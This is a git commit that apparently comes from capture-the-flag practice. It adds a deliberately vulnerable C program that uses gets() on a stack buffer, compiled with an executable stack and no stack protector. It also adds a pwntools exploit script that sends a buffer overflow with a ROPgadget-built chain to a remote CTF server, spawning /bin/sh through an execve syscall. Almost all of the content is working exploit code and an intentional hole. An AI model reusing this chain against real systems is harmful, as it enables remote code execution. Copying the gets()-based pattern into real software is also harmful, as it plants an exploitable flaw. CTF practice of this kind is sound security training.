fc488e87ec16f679459b2289e73f8b340743cf3d
wuling31715 <wuling31715@gmail.com>
2020-04-14 21:01:29 +0800

    .

---
+++ adl/example/bof.c
@@ -0,0 +1,12 @@
+#include <stdio.h>
+
+/* compiled with -z execstack -fno-stack-protector */
+
+int main(){
+	char buf[100];
+	setbuf(stdout, NULL);
+	printf("%p\n", buf);
+	gets(buf);
+	return 0;
+}
+
--- adl/notepad_plus/main.py
+++ adl/notepad_plus/main.py
@@ -1,13 +1,92 @@
 from pwn import *
-import struct
+from struct import pack
 
 # print(cyclic(1000))
 
 ip = 'ctf.adl.tw'
 port = 11004
-
 r = remote(ip, port)
-payload = "aaaabaaacaaadaaaeaaafaaagaaahaaaiaaajaaakaaalaaamaaanaaaoaaapaaaqaaaraaasaaataaauaaavaaawaaaxaaayaaazaabbaabcaabdaabeaabfaabgaabhaabiaabjaabkaablaabmaab"
-payload += ""
-r.sendline(payload)
+
+p = "aaaabaaacaaadaaaeaaafaaagaaahaaaiaaajaaakaaalaaamaaanaaaoaaapaaaqaaaraaasaaataaauaaavaaawaaaxaaayaaazaabbaabcaabdaabeaabfaabgaabhaabiaabjaabkaablaabmaab"
+
+# ROPgadget --ropchain --binary notepad_plus > log
+
+p += pack('<Q', 0x00000000004124d3) # pop rsi ; ret
+p += pack('<Q', 0x00000000006b90e0) # @ .data
+p += pack('<Q', 0x000000000044cccc) # pop rax ; ret
+p += '/bin//sh'
+p += pack('<Q', 0x000000000047f511) # mov qword ptr [rsi], rax ; ret
+p += pack('<Q', 0x00000000004124d3) # pop rsi ; ret
+p += pack('<Q', 0x00000000006b90e8) # @ .data + 8
+p += pack('<Q', 0x0000000000443ab5) # xor rax, rax ; ret
+p += pack('<Q', 0x000000000047f511) # mov qword ptr [rsi], rax ; ret
+p += pack('<Q', 0x0000000000400686) # pop rdi ; ret
+p += pack('<Q', 0x00000000006b90e0) # @ .data
+p += pack('<Q', 0x00000000004124d3) # pop rsi ; ret
+p += pack('<Q', 0x00000000006b90e8) # @ .data + 8
+p += pack('<Q', 0x000000000044cd25) # pop rdx ; ret
+p += pack('<Q', 0x00000000006b90e8) # @ .data + 8
+p += pack('<Q', 0x0000000000443ab5) # xor rax, rax ; ret
+p += pack('<Q', 0x0000000000474960) # add rax, 1 ; ret
+p += pack('<Q', 0x0000000000474960) # add rax, 1 ; ret
+p += pack('<Q', 0x0000000000474960) # add rax, 1 ; ret
+p += pack('<Q', 0x0000000000474960) # add rax, 1 ; ret
+p += pack('<Q', 0x0000000000474960) # add rax, 1 ; ret
+p += pack('<Q', 0x0000000000474960) # add rax, 1 ; ret
+p += pack('<Q', 0x0000000000474960) # add rax, 1 ; ret
+p += pack('<Q', 0x0000000000474960) # add rax, 1 ; ret
+p += pack('<Q', 0x0000000000474960) # add rax, 1 ; ret
+p += pack('<Q', 0x0000000000474960) # add rax, 1 ; ret
+p += pack('<Q', 0x0000000000474960) # add rax, 1 ; ret
+p += pack('<Q', 0x0000000000474960) # add rax, 1 ; ret
+p += pack('<Q', 0x0000000000474960) # add rax, 1 ; ret
+p += pack('<Q', 0x0000000000474960) # add rax, 1 ; ret
+p += pack('<Q', 0x0000000000474960) # add rax, 1 ; ret
+p += pack('<Q', 0x0000000000474960) # add rax, 1 ; ret
+p += pack('<Q', 0x0000000000474960) # add rax, 1 ; ret
+p += pack('<Q', 0x0000000000474960) # add rax, 1 ; ret
+p += pack('<Q', 0x0000000000474960) # add rax, 1 ; ret
+p += pack('<Q', 0x0000000000474960) # add rax, 1 ; ret
+p += pack('<Q', 0x0000000000474960) # add rax, 1 ; ret
+p += pack('<Q', 0x0000000000474960) # add rax, 1 ; ret
+p += pack('<Q', 0x0000000000474960) # add rax, 1 ; ret
+p += pack('<Q', 0x0000000000474960) # add rax, 1 ; ret
+p += pack('<Q', 0x0000000000474960) # add rax, 1 ; ret
+p += pack('<Q', 0x0000000000474960) # add rax, 1 ; ret
+p += pack('<Q', 0x0000000000474960) # add rax, 1 ; ret
+p += pack('<Q', 0x0000000000474960) # add rax, 1 ; ret
+p += pack('<Q', 0x0000000000474960) # add rax, 1 ; ret
+p += pack('<Q', 0x0000000000474960) # add rax, 1 ; ret
+p += pack('<Q', 0x0000000000474960) # add rax, 1 ; ret
+p += pack('<Q', 0x0000000000474960) # add rax, 1 ; ret
+p += pack('<Q', 0x0000000000474960) # add rax, 1 ; ret
+p += pack('<Q', 0x0000000000474960) # add rax, 1 ; ret
+p += pack('<Q', 0x0000000000474960) # add rax, 1 ; ret
+p += pack('<Q', 0x0000000000474960) # add rax, 1 ; ret
+p += pack('<Q', 0x0000000000474960) # add rax, 1 ; ret
+p += pack('<Q', 0x0000000000474960) # add rax, 1 ; ret
+p += pack('<Q', 0x0000000000474960) # add rax, 1 ; ret
+p += pack('<Q', 0x0000000000474960) # add rax, 1 ; ret
+p += pack('<Q', 0x0000000000474960) # add rax, 1 ; ret
+p += pack('<Q', 0x0000000000474960) # add rax, 1 ; ret
+p += pack('<Q', 0x0000000000474960) # add rax, 1 ; ret
+p += pack('<Q', 0x0000000000474960) # add rax, 1 ; ret
+p += pack('<Q', 0x0000000000474960) # add rax, 1 ; ret
+p += pack('<Q', 0x0000000000474960) # add rax, 1 ; ret
+p += pack('<Q', 0x0000000000474960) # add rax, 1 ; ret
+p += pack('<Q', 0x0000000000474960) # add rax, 1 ; ret
+p += pack('<Q', 0x0000000000474960) # add rax, 1 ; ret
+p += pack('<Q', 0x0000000000474960) # add rax, 1 ; ret
+p += pack('<Q', 0x0000000000474960) # add rax, 1 ; ret
+p += pack('<Q', 0x0000000000474960) # add rax, 1 ; ret
+p += pack('<Q', 0x0000000000474960) # add rax, 1 ; ret
+p += pack('<Q', 0x0000000000474960) # add rax, 1 ; ret
+p += pack('<Q', 0x0000000000474960) # add rax, 1 ; ret
+p += pack('<Q', 0x0000000000474960) # add rax, 1 ; ret
+p += pack('<Q', 0x0000000000474960) # add rax, 1 ; ret
+p += pack('<Q', 0x0000000000474960) # add rax, 1 ; ret
+p += pack('<Q', 0x0000000000474960) # add rax, 1 ; ret
+p += pack('<Q', 0x000000000040142c) # syscall
+
+r.sendline(p)
 r.interactive()
